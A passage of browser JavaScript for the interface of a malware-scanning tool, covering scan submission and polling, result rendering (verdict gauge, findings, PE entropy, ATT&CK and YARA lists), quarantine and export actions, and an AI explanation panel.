  const label = state.mode === "file" ? (state.diskPath || state.file.name) : state.mode === "url" ? $("url").value.trim() : ax("pastedText");
  showProgress(label);
  try {
    let job;
    if (state.mode === "file" && state.diskPath) {
      job = await postJSON("/api/scan", { mode: "path", value: state.diskPath, external: externalOn() });
    } else if (state.mode === "file") {
      job = await uploadFile("/api/scan/file", state.file, { "X-Filename": encodeURIComponent(state.file.name), "Content-Type": "application/octet-stream", "X-CyberScan-External": externalOn() ? "1" : "0" });
    } else {
      job = await postJSON("/api/scan", { mode: state.mode, value: $(state.mode).value, external: externalOn() });
    }
    // the online version answers with the finished scan; the local server with a job to follow
    if (job.status) showJob(job, job.id); else poll(job.id);
  } catch (err) {
    showError(err);
  }
}

function scanPath(path) {
  location.hash = "#/scan";
  const name = path.split(/[\\/]/).pop();
  tabs[0].click();
  chooseDisk(path, name, 0);
  $("drop-label").textContent = name;
  $("form").requestSubmit();
}

function poll(id) {
  clearTimeout(state.polling);
  api(`/api/scan/${id}`).then((job) => showJob(job, id)).catch((err) => showError(err));
}

function showJob(job, id) {
  if (!job.stages) { showError(job.error ? { message: job.error } : { kind: "network" }); return; }
  renderStages(job.stages);
  if (job.status === "running") { state.polling = setTimeout(() => poll(id), 220); return; }
  if (job.status === "failed") { showError({ message: String(job.error || ""), info: job.error_info }); return; }
  renderStages(job.stages.map((s) => ({ ...s, state: "complete" })));
  state.history = null;
  // when the scan finished (the server's record has its own time; a fresh result may not carry one)
  if (job.result && !job.result.timestamp) job.result.scanned_at = job.result.scanned_at || new Date().toISOString();
  // let the scan theater finish its sweep: at least 1.4 s on screen
  const wait = Math.max(450, 1400 - (performance.now() - (state.scanStarted || 0)));
  setTimeout(() => {
    state.lastResult = job.result;
    renderResult(job.result, true);
    if (cells) { cells.setMode("ambient"); if (verdictOf(job.result).cls === "NO_INDICATORS_OBSERVED") cells.heal(); }
    const p = plainOf(job.result);
    notify(job.result.target, p ? p.summary.headline : verdictWords(verdictOf(job.result).cls)[0]);
  }, wait);
}

function showProgress(label) {
  state.scanStarted = performance.now();
  $("batch").hidden = true;
  $("error").hidden = true;
  $("result").hidden = true;
  document.querySelector(".composer").hidden = true;
  $("progress").hidden = false;
  $("progress").classList.remove("failed");
  $("progress").querySelector("h2").textContent = t("working");
  $("progress-target").textContent = label || "";
  $("progress-target").dir = "auto";
  restartAnim($("progress"));
  renderStages([]);
  $("stage-detail").textContent = "";
  if (cells) cells.setMode("scan");
  window.dispatchEvent(new CustomEvent("cs:scan-start", { detail: label || "" }));
}

/* A scan that didn't finish: said where the person is looking (in place of the progress, with the
 * timeline kept), in plain words, with a way to try again or to choose something else. */
function showError(err) {
  clearTimeout(state.polling);
  const text = friendlyError(err);
  window.dispatchEvent(new CustomEvent("cs:scan-error", { detail: text }));
  const progress = $("progress");
  const scanning = !progress.hidden;
  progress.classList.add("failed");
  progress.querySelector("h2").textContent = ax("errTitle");
  if (!scanning) document.querySelector(".composer").hidden = false;
  const box = $("error");
  box.replaceChildren();
  box.tabIndex = -1;
  const head = el("h2", "err-title", ax("errTitle"));
  const p = el("p", "err-text", text);
  const row = el("div", "err-actions");
  if (scanning) {
    const again = el("button", "primary", ax("errRetry")); again.type = "button";
    again.addEventListener("click", () => { box.hidden = true; runScan(); });
    const other = el("button", "ghost", state.mode === "url" ? ax("errEditLink") : state.mode === "text" ? ax("errEditText") : ax("errOther")); other.type = "button";
    other.addEventListener("click", () => {
      const mode = state.mode;
      newScan();
      if (mode === "file") $("file").click();
      else $(mode).focus();
    });
    row.append(again, other);
  }
  box.append(head, p, row);
  box.hidden = false;
  restartAnim(box);
  if (cells) cells.setMode("ambient");
  updateReady();
  requestAnimationFrame(() => {
    box.scrollIntoView({ behavior: matchMedia("(prefers-reduced-motion: reduce)").matches ? "auto" : "smooth", block: "center" });
    (box.querySelector("button") || box).focus({ preventScroll: true });
  });
}

function renderStages(stages) {
  [...document.querySelectorAll(".stages li")].forEach((li, i) => {
    li.classList.remove("running", "complete");
    const s = stages[i];
    if (s && s.state !== "pending") li.classList.add(s.state);
  });
  // the server's stage lines, in the user's language
  const said = stages.map((s) => (s ? { ...s, detail: s.detail ? stageText(s.detail) : "" } : s));
  const current = [...said].reverse().find((s) => s && s.detail);
  if (current) $("stage-detail").textContent = current.detail;
  window.dispatchEvent(new CustomEvent("cs:stages", { detail: said }));
}

/* ===================================================================
 * Result
 * =================================================================== */
const RISK_COLOR = { EMPTY: "--muted", KNOWN_MALWARE: "--bad", NO_INDICATORS_OBSERVED: "--ok", REVIEW: "--warn", SUSPICIOUS: "--bad" };
const TONE_COLOR = { ok: "--ok", warn: "--warn", danger: "--bad", info: "--accent", neutral: "--muted" };
const SEV_COLOR = { high: "--bad", critical: "--bad", medium: "--warn", low: "--accent", info: "--muted" };

function plainOf(r) { return (r.plain && (r.plain[lang] || r.plain.en)) || null; }
/* When the scan ran: the saved record's time, else the moment this browser received the result. */
const scanTime = (r) => (r && (r.timestamp || r.scanned_at)) || null;

/* Every finding of a result, once, in the user's language: the server's plain-language list (already
 * translated and with identical engine entries merged), plus the content inspection's own findings
 * it doesn't cover. The summary, the Findings tab, the report and the exports all use this list, so
 * they always count the same things. */
function findingsOf(r) {
  if (!r) return [];
  const lower = (s) => String(s || "").trim().toLowerCase();
  const plain = plainOf(r), plainEn = r.plain && r.plain.en;
  const ev = Array.isArray(r.evidence) ? r.evidence : [];
  const content = (r.content_analysis && r.content_analysis.findings) || [];
  const srcOf = (cat, whereEn) => {
    const c = lower(cat);
    return c === "model" || whereEn === "Learning model" ? "model" : c === "osint" || whereEn === "Online reports" ? "external" : "observed";
  };
  // a ZIP whose members were scanned one by one: the older "members were not scanned" note is out of date
  const arch = r.intel && r.intel.archive;
  const archiveScanned = !!(arch && arch.status === "ok" && Number(arch.scanned) > 0);
  const stale = (f) => archiveScanned && lower(f.category) === "archive" && /not (independently )?(malware-)?scanned/i.test(loc(f.explanation));
  const out = [];
  const pList = plain && plain.details && Array.isArray(plain.details.findings) ? plain.details.findings : [];
  if (pList.length) {
    const enList = (plainEn && plainEn.details && plainEn.details.findings) || pList;
    const used = new Set();
    const items = pList.map((pf, i) => {
      const en = enList[i] || pf;
      const matches = [];
      ev.forEach((f, k) => {
        if (used.has(k)) return;
        if (lower(loc(f.evidence)) === lower(en.title) || (f.explanation && lower(loc(f.explanation)) === lower(en.body))) { used.add(k); matches.push(f); }
      });
      return { pf, en, matches };
    });
    // one plain line can stand for several engine entries (same meaning): give it the same-severity entries left
    items.forEach((it) => {
      const want = Number(it.pf.count) || 1;
      ev.forEach((f, k) => { if (it.matches.length < want && !used.has(k) && lower(f.severity) === lower(it.pf.severity)) { used.add(k); it.matches.push(f); } });
    });
    items.forEach(({ pf, en, matches }) => {
      if (matches.length && matches.every(stale)) return;
      out.push({
        title: loc(pf.title), text: loc(pf.body), sev: lower(pf.severity) || "info",
        contrib: Math.max(0, ...matches.map((f) => Number(f.contribution) || 0)), cat: (matches[0] && matches[0].category) || "",
        where: loc(pf.where), src: srcOf(matches[0] && matches[0].category, en.where), count: Number(pf.count) || 1,
      });
    });
  } else {
    ev.forEach((f) => {
      if (stale(f)) return;
      out.push({ title: loc(f.evidence || f.title || f.category), text: loc(f.explanation || f.detail), sev: lower(f.severity) || "info",
        contrib: Number(f.contribution) || 0, cat: f.category || "", where: "", src: srcOf(f.category), count: Number(f.count) || 1 });
    });
  }
  const known = new Set([...out.map((f) => lower(f.title)), ...ev.map((f) => lower(loc(f.evidence))),
    ...(((plainEn && plainEn.details && plainEn.details.findings) || []).map((f) => lower(f.title)))]);
  content.forEach((f) => {
    const title = loc(f.label || f.title || f.evidence || f.type) || t("contentEvidence");
    if (known.has(lower(title))) return;
    known.add(lower(title));
    out.push({ title, text: loc(f.explanation || f.evidence || ""), sev: lower(f.severity) || "info", contrib: Number(f.contribution) || 0,
      cat: f.category || "content", where: "", src: "observed", count: Number(f.count) || 1 });
  });
  const RANK = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  out.sort((a, b) => (b.contrib - a.contrib) || ((RANK[a.sev] ?? 5) - (RANK[b.sev] ?? 5)));
  return out;
}

function renderResult(r, animate) {
  document.querySelector(".composer").hidden = true;
  $("batch").hidden = true;
  $("progress").hidden = true;
  $("error").hidden = true;
  const view = $("result");
  view.hidden = false;
  if (animate) { view.querySelectorAll(":scope > .card").forEach(restartAnim); window.scrollTo({ top: 0, behavior: "smooth" }); }

  const plain = plainOf(r);
  const s = plain && plain.summary;
  const shown = verdictOf(r);
  const classification = shown.cls;
  const fallback = verdictWords(classification);
  const tone = r.detection_summary
    ? (RISK_COLOR[classification] || "--warn")
    : s ? (TONE_COLOR[s.tone] || "--accent") : (RISK_COLOR[classification] || "--accent");
  document.documentElement.style.setProperty("--risk", `var(${tone})`);
  $("badge").textContent = r.detection_summary ? fallback[0] : s ? `${s.symbol} ${t("toneBadge")[s.tone] || fallback[0]}` : fallback[0];
  $("verdict-title").textContent = r.detection_summary ? fallback[1] : s ? s.headline : fallback[1];
  $("verdict-body").textContent = r.detection_summary ? fallback[2] : s ? s.sentence : fallback[2];
  $("verdict-advice").textContent = r.detection_summary
    ? t("detectionCombinedAdvice")
    : s ? [s.advice, s.limit].filter(Boolean).join(" ") : "";
  $("verdict-advice").hidden = r.detection_summary ? false : !(s && (s.advice || s.limit));
  const notice = $("notice");
  notice.hidden = !(s && s.notice);
  if (s && s.notice) { notice.textContent = s.notice; notice.classList.toggle("danger", s.notice_tone === "danger"); }
  if (r.detection_status && r.detection_status !== "complete") {
    notice.hidden = false;
    notice.textContent = t("detectionIncomplete");
    notice.classList.add("danger");
  }
  const chips = $("facts-chips");
  chips.replaceChildren(...((s && s.facts) || []).map((f) => el("li", "", f)));
  const secs = elapsedOf(r);
  if (secs != null) chips.append(el("li", "", ax("elapsed", { s: secs.toFixed(1) })));
  $("target").textContent = targetLabel(r, true);
  $("target").dir = "auto";
  const when = scanTime(r);
  $("when").hidden = !when;
  if (when) $("when").textContent = tf("scannedAt", { d: formatWhen(when, true) });
  $("gauge").setAttribute("aria-label", `${shown.score} / 100`);
  $("limits").textContent = limitsLabel(r);

  const meter = $("meter");
  const circumference = 326.73;
  const offset = circumference * (1 - shown.score / 100);
  if (animate) {
    meter.style.strokeDashoffset = circumference;
    requestAnimationFrame(() => requestAnimationFrame(() => { meter.style.strokeDashoffset = offset; }));
    countUp($("score"), shown.score, 1700);
    impact(r);
  } else {
    meter.style.strokeDashoffset = offset;
    $("score").textContent = shown.score;
  }

  renderActions(r);
  renderFindings(r, plain, animate);
  renderDetails(r, plain, animate);
  renderChecks(plain);
  renderAttack(r);
  renderTech(r);
  if (animate) { selectTab("findings"); $("ai-card").hidden = true; stopAi(); }
  if (state.cube && currentTab() === "structure") state.cube.setData(r.structure);
  window.dispatchEvent(new CustomEvent("cs:result", { detail: { result: r, animate } }));
}

/* The result arrives: cells burst out of the gauge, a ring pulses, and a
 * suspicious result gives the card a short shake. */
function impact(r) {
  if (matchMedia("(prefers-reduced-motion: reduce)").matches) return;
  const card = document.querySelector(".verdict");
  const gauge = $("gauge");
  card.classList.remove("impact", "shake");
  void card.offsetWidth;
  setTimeout(() => {
    card.classList.add("impact");
    const v = verdictOf(r).cls;
    if (v === "SUSPICIOUS" || v === "KNOWN_MALWARE") card.classList.add("shake");
    const burst = el("div", "burst");
    for (let i = 0; i < 26; i++) {
      const s = el("i");
      const a = (i / 26) * Math.PI * 2 + Math.random() * 0.3;
      const d = 90 + Math.random() * 120;
      s.style.setProperty("--dx", `${Math.cos(a) * d}px`);
      s.style.setProperty("--dy", `${Math.sin(a) * d}px`);
      s.style.setProperty("--r", `${Math.random() * 360}deg`);
      s.style.setProperty("--s", (0.5 + Math.random() * 0.9).toFixed(2));
      s.style.animationDelay = `${Math.random() * 0.12}s`;
      burst.append(s);
    }
    gauge.append(burst);
    setTimeout(() => burst.remove(), 1600);
    const gr = gauge.getBoundingClientRect();
    if (cells) cells.pulse(gr.left + gr.width / 2, gr.top + gr.height / 2);
  }, 1350);
}

function renderFindings(r, plain, animate) {
  const list = $("evidence");
  list.replaceChildren();
  const findings = findingsOf(r).map((f) => ({ severity: f.sev, title: f.title, body: f.text, word: sevWord(f.sev), where: f.where, count: f.count }));
  if (!findings.length) {
    const li = el("li", "empty");
    const top = el("div", "ev-top");
    top.append(el("strong", "", t("noEvidence")));
    li.append(top, el("span", "body", t("noEvidenceBody")));
    list.append(li);
    return;
  }
  findings.forEach((f, i) => {
    const li = el("li");
    li.style.setProperty("--sev", `var(${SEV_COLOR[f.severity] || "--muted"})`);
    li.style.setProperty("--d", animate ? `${0.2 + i * 0.06}s` : "0s");
    const top = el("div", "ev-top");
    const name = el("strong", "", f.title + (f.count > 1 ? ` ×${f.count}` : "")); name.dir = "auto";
    top.append(name, el("span", "sev", f.word || ""));
    li.append(top);
    if (f.body && f.body.trim() !== f.title.trim()) { const b = el("span", "body", f.body); b.dir = "auto"; li.append(b); }
    if (f.where) li.append(el("em", "", f.where));
    list.append(li);
  });
}

function renderDetails(r, plain, animate) {
  const facts = $("facts");
  facts.replaceChildren();
  ((plain && plain.details.facts) || (r.sha256 ? [["SHA-256", r.sha256]] : [])).forEach(([k, v]) => {
    const row = el("div");
    const isHash = /sha|بصمة/i.test(k);
    const dd = el("dd", isHash ? "hash" : "", loc(v));
    dd.dir = isHash ? "ltr" : "auto";
    row.append(el("dt", "", loc(k)), dd);
    facts.append(row);
  });
  {
    const row = el("div");
    row.append(el("dt", "", ax("cScore")), el("dd", "", ax("scoreLine", { n: verdictOf(r).score })));
    facts.append(row);
  }
  drawSpark(r.entropy, animate);

  const pe = $("pe");
  pe.replaceChildren();
  if (!r.pe) { pe.append(el("p", "muted", t("noPe"))); return; }
  const sections = el("div", "pe-sections");
  (r.pe.sections || []).forEach((s) => {
    const row = el("div", "pe-row");
    const bar = el("div", "pe-bar");
    const fill = el("i");
    const rgb = CyberCube.entropyColor(s.entropy || 0);
    fill.style.background = `rgb(${rgb.map((v) => v | 0).join(",")})`;
    bar.append(fill);
    row.append(el("span", "", s.name || "?"), bar, el("span", "", (s.entropy || 0).toFixed(2)));
    sections.append(row);
    requestAnimationFrame(() => requestAnimationFrame(() => { fill.style.width = `${Math.min(100, (s.entropy / 8) * 100)}%`; }));
  });
  pe.append(el("h3", "", t("peSections")), sections);
  if ((r.pe.suspicious_imports || []).length) {
    const tags = el("div", "tag-list");
    r.pe.suspicious_imports.forEach((name) => tags.append(el("span", "", name)));
    pe.append(el("h3", "", t("peImports")), tags);
  }
}

function renderChecks(plain) {
  const list = $("checks");
  list.replaceChildren();
  ((plain && plain.details.checks) || []).forEach((c, i) => {
    const li = el("li");
    li.style.setProperty("--tone", `var(${TONE_COLOR[c.tone] || "--muted"})`);
    li.style.setProperty("--d", `${i * 0.04}s`);
    li.append(el("i", "", c.symbol), el("b", "", loc(c.name)), el("small", "", loc(c.reason) || loc(c.state)));
    list.append(li);
  });
}
/* The plain-language check line for each engine (matched in order: two engines can share a raw status). */
function checksByEngine(r) {
  const out = new Map();
  const plain = plainOf(r), en = r.plain && r.plain.en;
  const list = en && en.details && Array.isArray(en.details.checks) ? en.details.checks : [];
  const used = new Set();
  Object.entries(r.engines || {}).forEach(([name, status]) => {
    const i = list.findIndex((c, k) => !used.has(k) && c.raw === status);
    if (i < 0) return;
    used.add(i);
    const c = plain && plain.details.checks && plain.details.checks[i];
    if (c) out.set(name, { name: loc(c.name), state: loc(c.state) });
  });
  return out;
}
/* An engine's name the plain-language checks don't cover, in the user's language. */
const engineName = (name) => (ax("engNames") || {})[name] || name;
/* An engine's status in words: the server's own translation when it sends one, else its plain-language
 * check line, else the raw status with the common codes spelled out. */
function engineText(r, name, status, checks) {
  if (status && typeof status === "object") return loc(status);
  const s = String(status || "");
  const c = (checks || checksByEngine(r)).get(name);
  if (c) return c.state;   // the raw engine status stays in the row's tooltip (Technical tab), never in the text
  const archive = r.intel && r.intel.archive;
  if (/member contents not malware-scanned/i.test(s) && archive && archive.status === "ok" && archive.scanned > 0) return s.replace(/;?\s*member contents not malware-scanned/i, "");
  return ax("eng")[s] || s.replace(/_/g, " ");
}

/* ATT&CK techniques actually mapped (the engine lists "N/A · No mapped ATT&CK technique" when there are none). */
const mitreOf = (r) => ((r && r.mitre) || []).filter((m) => m && m.id && !/^n\/?a$/i.test(String(m.id).trim()));
function renderAttack(r) {
  const mitre = $("mitre");
  mitre.replaceChildren();
  const techniques = mitreOf(r);
  if (!techniques.length) mitre.append(el("li", "muted", t("noMitre")));
  techniques.forEach((m) => {
    const li = el("li");
    li.append(el("code", "", m.id || "T?"), document.createTextNode(m.name || ""));
    if (m.tactic) li.append(el("small", "muted", ` · ${m.tactic}`));
    mitre.append(li);
  });
  const yara = $("yara");
  yara.replaceChildren();
  if (!(r.yara || []).length) yara.append(el("li", "muted", t("noYara")));
  (r.yara || []).forEach((y) => {
    const li = el("li");
    li.append(el("code", "", y.rule || y.rule_name || y.name || y.id || "–"), document.createTextNode((y.meta && y.meta.description) || (y.tags || []).join(", ")));
    yara.append(li);
  });
}

function renderTech(r) {
  const raw = $("raw");
  raw.replaceChildren();
  const rawHead = document.querySelector('[data-i18n="rawEvidence"]');
  if (rawHead) { rawHead.dataset.keep = "1"; rawHead.textContent = ax("techEvidence"); }
  // every finding with its technical detail (category, weight), the same list the summary counts
  const all = findingsOf(r);
  if (!all.length) raw.append(el("li", "muted", t("noEvidence")));
  all.forEach((f) => {
    const li = el("li");
    li.style.setProperty("--sev", `var(${SEV_COLOR[f.sev] || "--muted"})`);
    const head = el("b");
    head.append(el("span", "raw-sev", sevWord(f.sev)), document.createTextNode(" · "));
    const title = el("bdi", "", f.title + (f.count > 1 ? ` ×${f.count}` : ""));
    head.append(title);
    li.append(head);
    const meta = [f.contrib ? `+${f.contrib}` : "", f.cat].filter(Boolean).join(" · ");
    if (meta) { const m = el("code", "raw-meta", meta); m.dir = "ltr"; li.append(document.createTextNode(" "), m); }
    if (f.text && f.text.trim() !== f.title.trim()) { const p = el("span", "raw-text", f.text); p.dir = "auto"; li.append(p); }
    li.dir = "auto";
    raw.append(li);
  });
  const ml = $("ml");
  ml.replaceChildren();
  const p = r.prediction || {};
  const scores = Object.entries(p.class_scores || {});
  const mlCheck = engineText(r, "ML", (r.engines || {}).ML || r.model_status || p.status || "–");
  ml.append(el("p", "muted", `${t("model")}: ${mlCheck}`));
  if (scores.length) {
    const bars = el("div", "ml-bars");
    scores.forEach(([name, value]) => {
      const row = el("div", "pe-row");
      const bar = el("div", "pe-bar"); const fill = el("i");
      fill.style.background = "var(--accent-2)";
      bar.append(fill);
      row.append(el("span", "", name), bar, el("span", "", `${Number(value).toFixed(1)}%`));
      bars.append(row);
      requestAnimationFrame(() => requestAnimationFrame(() => { fill.style.width = `${Math.min(100, Number(value))}%`; }));   // class_scores are percentages already
    });
    ml.append(bars);
  }
  const engines = $("engines");
  engines.replaceChildren();
  const checks = checksByEngine(r);
  Object.entries(r.engines || {}).forEach(([name, status]) => {
    const li = el("li");
    const label = checks.has(name) ? checks.get(name).name : engineName(name);
    li.append(el("b", "", label), document.createTextNode(` ${engineText(r, name, status, checks)}`));
    if (typeof status === "string") li.title = `${name}: ${status}`;
    li.dir = "auto";
    engines.append(li);
  });
}

/* result tabs */
const rtabs = [...document.querySelectorAll(".rtab")];
function currentTab() { return (rtabs.find((b) => b.classList.contains("active")) || rtabs[0]).dataset.tab; }
rtabs.forEach((b) => {
  b.id = `rtab-${b.dataset.tab}`;
  b.setAttribute("aria-controls", `rpanel-${b.dataset.tab}`);
  b.tabIndex = b.classList.contains("active") ? 0 : -1;
});
document.querySelectorAll(".rpanel").forEach((p) => { p.id = `rpanel-${p.dataset.tab}`; p.setAttribute("role", "tabpanel"); p.setAttribute("aria-labelledby", `rtab-${p.dataset.tab}`); });
function selectTab(name) {
  rtabs.forEach((b) => { const on = b.dataset.tab === name; b.classList.toggle("active", on); b.setAttribute("aria-selected", on); b.tabIndex = on ? 0 : -1; });
  document.querySelectorAll(".rpanel").forEach((p) => { p.hidden = p.dataset.tab !== name; });
  const on = rtabs.find((b) => b.dataset.tab === name);
  if (on && rtabStrip.scrollWidth > rtabStrip.clientWidth) {
    const s = rtabStrip.getBoundingClientRect(), r = on.getBoundingClientRect();
    if (r.left < s.left || r.right > s.right) rtabStrip.scrollBy({ left: r.left < s.left ? r.left - s.left - 24 : r.right - s.right + 24 });
  }
  if (name === "structure") {
    const r = state.lastResult;
    const has = r && r.structure && r.structure.entropy && r.structure.entropy.length;
    $("no-structure").hidden = !!has;
    document.querySelector(".app-cube").hidden = !has;
    $("r-legend").hidden = !has;
    if (has) {
      if (!state.cube) state.cube = CyberCube.create($("r-cube"), $("r-cube-tip"));
      requestAnimationFrame(() => state.cube.setData(r.structure));
    }
  }
}
rtabs.forEach((b) => b.addEventListener("click", () => selectTab(b.dataset.tab)));
roving(rtabs, (b) => selectTab(b.dataset.tab));
/* the tab strip scrolls on narrow screens: a fade on the side where more tabs wait */
const rtabStrip = $("rtabs");
function rtabsFade() {
  const max = rtabStrip.scrollWidth - rtabStrip.clientWidth;
  const pos = Math.abs(rtabStrip.scrollLeft);
  const rtl = document.documentElement.dir === "rtl";
  const atStart = pos <= 2, atEnd = pos >= max - 2;
  rtabStrip.classList.toggle("more-end", max > 2 && (rtl ? !atStart : !atEnd));
  rtabStrip.classList.toggle("more-start", max > 2 && (rtl ? !atEnd : !atStart));
}
rtabStrip.addEventListener("scroll", rtabsFade, { passive: true });
window.addEventListener("resize", rtabsFade);
window.addEventListener("cs:result", () => requestAnimationFrame(rtabsFade));

function renderLegend(list) {
  if (!list) return;
  const colors = ["rgb(30,58,138)", "rgb(56,189,248)", "rgb(244,114,182)", "rgb(248,113,113)"];
  list.replaceChildren(...t("legend").map((label, i) => { const li = el("li"); const sw = el("i"); sw.style.background = colors[i]; li.append(sw, label); return li; }));
}

/* actions */
function actionButton(label, onClick, cls = "") {
  const b = el("button", `ghost ${cls}`.trim(), label);
  b.type = "button";
  b.addEventListener("click", async () => {
    b.disabled = true;
    try { await onClick(); } catch (err) { toast(err.message); }
    b.disabled = false;
  });
  return b;
}

function renderActions(r) {
  const bar = $("actions");
  bar.replaceChildren();
  const id = r.record_id;
  const isFile = (r.mode || "") === "File";
  const onDisk = isFile && r.exists;
  const plain = plainOf(r);
  const suggested = (plain && plain.summary.actions) || ["quarantine", "reveal"];
  const buttons = [];
  if (id && r.quarantined) {
    buttons.push(actionButton(t("aRestore"), async () => {
      await postJSON(`/api/history/${id}/restore`);
      r.quarantined = false; r.exists = true; state.history = null;
      toast(t("restored")); renderActions(r);
    }, "go"));
  } else if (id && onDisk && suggested.includes("quarantine")) {
    buttons.push(actionButton(t("aQuarantine"), async () => {
      if (!(await confirmDialog(t("qConfirmTitle"), t("qConfirmBody"), t("qConfirm")))) return;
      await postJSON(`/api/history/${id}/quarantine`);
      r.quarantined = true; r.exists = false; state.history = null;
      toast("🔒 " + t("quarantined")); renderActions(r);
    }, "warn"));
  }
  if (id && onDisk) buttons.push(actionButton(t("aReveal"), () => postJSON(`/api/history/${id}/reveal`)));
  if (onDisk) buttons.push(actionButton(t("aRepair"), () => { location.hash = "#/repair"; window.CSRepair && CSRepair.openPath(r.target); }));
  if (id && state.ai && state.ai.enabled && state.ai.state === "ready") buttons.push(actionButton("✦ " + t("aAi"), () => startAi(id)));
  // the text report is written here, from the same score, verdict and findings the page shows
  const base = (modeOf(r) === "url" ? (hostOf(r.target) || "link") : modeOf(r) === "text" ? "text" : String(r.target || "scan").split(/[\\/]/).pop())
    .replace(/[^\w.\- ]/g, "_").slice(0, 80) || "scan";
  const save = (text, name, type) => { const a = el("a"); a.href = URL.createObjectURL(new Blob([text], { type })); a.download = name; document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 4000); };
  buttons.push(actionButton(t("aExportTxt"), () => save(reportText(r), `${base}.cyberscan.txt`, "text/plain;charset=utf-8")));
  if (id) buttons.push(actionButton(t("aExportJson"), () => download(`/api/history/${id}/export?format=json`)));
  else buttons.push(actionButton(t("aExportJson"), () => save(JSON.stringify(r, null, 2), `${base}.cyberscan.json`, "application/json")));
  if (r.sha256) buttons.push(actionButton(t("aCopyHash"), async () => { await navigator.clipboard.writeText(r.sha256); toast(t("copied")); }));
  buttons.push(actionButton(t("copy"), async () => { await navigator.clipboard.writeText(reportText(r)); toast(t("copied")); }));
  buttons.push(actionButton("⎙ " + t("pPrint"), () => { $("result").dataset.printed = new Date().toLocaleString(lang); window.print(); }));
  buttons.push(actionButton(t("again"), () => newScan()));
  buttons.forEach((b, i) => b.style.setProperty("--i", i));
  bar.append(...buttons);
}

const hostOf = (u) => { try { return new URL(String(u)).host; } catch { return ""; } };
/* The plain-text report (Copy report, Export .txt): the page's own score, verdict and findings, in the user's language. */
function reportText(r) {
  const v = verdictOf(r);
  const verdict = verdictWords(v.cls);
  const lines = [ax("copyHead"), "=".repeat(ax("copyHead").length), ""];
  const kv = (k, val) => { if (val !== undefined && val !== null && val !== "") lines.push(`${k}: ${val}`); };
  kv(ax("cTarget"), targetLabel(r, true));
  kv(ax("cMode"), typeLabel(modeOf(r) === "file" ? ((r.content_analysis && r.content_analysis.file_type) || "file") : modeOf(r)));
  kv(ax("cVerdict"), `${verdict[1] || verdict[0]}`);
  kv(ax("cScore"), `${v.score}/100`);
  const when = scanTime(r);
  if (when) kv(ax("cScanned"), formatWhen(when, true));
  const secs = elapsedOf(r);
  if (secs != null) kv(ax("cElapsed"), ax("elapsed", { s: secs.toFixed(1) }));
  kv(ax("cSha"), r.sha256);
  lines.push("", `${ax("cFindings")}:`);
  const finds = findingsOf(r);
  if (!finds.length) lines.push(`  ${ax("cNone")}`);
  finds.forEach((f) => {
    lines.push(`- [${sevWord(f.sev)}] ${f.title}${f.count > 1 ? ` ×${f.count}` : ""}`);
    if (f.text && f.text.trim() !== f.title.trim()) lines.push(`    ${f.text}`);
  });
  const techniques = mitreOf(r);
  if (techniques.length) { lines.push("", `${t("mitre")}:`); techniques.forEach((m) => lines.push(`- ${m.id} ${m.name || ""}`.trimEnd())); }
  const checks = checksByEngine(r);
  const engines = Object.entries(r.engines || {});
  if (engines.length) {
    lines.push("", `${ax("cEngines")}:`);
    engines.forEach(([name, status]) => lines.push(`- ${checks.has(name) ? checks.get(name).name : engineName(name)}: ${engineText(r, name, status, checks)}`));
  }
  lines.push("", ax("cNote"));
  const lim = limitsLabel(r);
  if (lim) lines.push(lim);
  return lines.join("\n") + "\n";
}

function newScan() {
  state.lastResult = null;
  clearTimeout(state.polling);
  $("result").hidden = true;
  $("batch").hidden = true;
  $("error").hidden = true;
  $("progress").hidden = true;
  $("progress").classList.remove("failed");
  const composer = document.querySelector(".composer");
  composer.hidden = false;
  resetChoice();
  restartAnim(composer);
  requestAnimationFrame(moveInk);
  updateReady();
  stopAi();
  window.scrollTo({ top: 0, behavior: "auto" });
  const target = state.mode === "url" ? $("url") : state.mode === "text" ? $("text") : drop;
  requestAnimationFrame(() => target.focus({ preventScroll: true }));
}

/* AI explanation */
async function loadAiStatus(force) {
  if (state.ai && !force) return state.ai;
  try { state.ai = await api("/api/ai/status"); } catch { state.ai = { state: "no_server", enabled: false, models: [] }; }
  renderAiSettings();
  return state.ai;
}

async function startAi(recordId) {
  const card = $("ai-card");
  card.hidden = false;
  card.classList.remove("done");
  restartAnim(card);
  const text = $("ai-text");
  text.textContent = "";
  text.classList.add("typing");
  card.scrollIntoView({ behavior: "smooth", block: "nearest" });
  const job = await postJSON(`/api/history/${recordId}/ai`, { lang });
  state.aiJob = job.id;
  const tick = async () => {
    if (state.aiJob !== job.id) return;
    let s;
    try { s = await api(`/api/ai/${job.id}`); } catch { text.classList.remove("typing"); return; }
    text.textContent = s.text;
    if (s.status === "running") { setTimeout(tick, 180); return; }
    text.classList.remove("typing");
    card.classList.add("done");
    if (s.status === "failed") text.textContent = t("aiErrors")[s.error] || t("aiErrors").error;
  };
  tick();
}
function stopAi() {
  if (state.aiJob) { postJSON(`/api/ai/${state.aiJob}/stop`).catch(() => {}); state.aiJob = null; }
  $("ai-text").classList.remove("typing");
}
$("ai-stop").addEventListener("click", () => { stopAi(); $("ai-text").textContent += "\n" + t("aiErrors").stopped; });

function drawSpark(entropy, animate) {
  const line = $("spark-line"), fill = $("spark-fill");
  const pts = (entropy && entropy.trajectory) || [];
  $("e-mean").textContent = pts.length ? entropy.mean.toFixed(2) : "–";
  $("e-peak").textContent = pts.length ? entropy.peak.toFixed(2) : "–";
  $("e-jumps").textContent = pts.length ? entropy.anomalies : "–";
  if (!pts.length) { line.setAttribute("d", ""); fill.setAttribute("d", ""); return; }
  const W = 300, H = 90;
  // a small file is one measuring window: draw it as a level line across the chart
  const series = pts.length === 1 ? [pts[0], pts[0]] : pts;
  const coords = series.map((v, i) => [(i / (series.length - 1)) * W, H - 4 - (Math.min(v, 8) / 8) * (H - 8)]);
  const d = coords.map(([x, y], i) => `${i ? "L" : "M"}${x.toFixed(1)},${y.toFixed(1)}`).join("");
  line.setAttribute("d", d);
  fill.setAttribute("d", `${d}L${W},${H}L0,${H}Z`);
  // no dash tricks: with a non-scaling stroke a dash measured in path units drew only part of the line
  line.removeAttribute("pathLength");
  line.style.strokeDasharray = "none";
  line.style.strokeDashoffset = "0";
  line.classList.remove("drawing");
  fill.classList.add("on");
  fill.style.opacity = "1";
  if (animate && !matchMedia("(prefers-reduced-motion: reduce)").matches && line.animate) {
    line.animate([{ opacity: 0 }, { opacity: 1 }], { duration: 900, easing: "ease-out" });
  }
}

function countUp(node, target, ms) {
  const start = performance.now();
  const step = (now) => {
    const p = Math.min((now - start) / ms, 1);
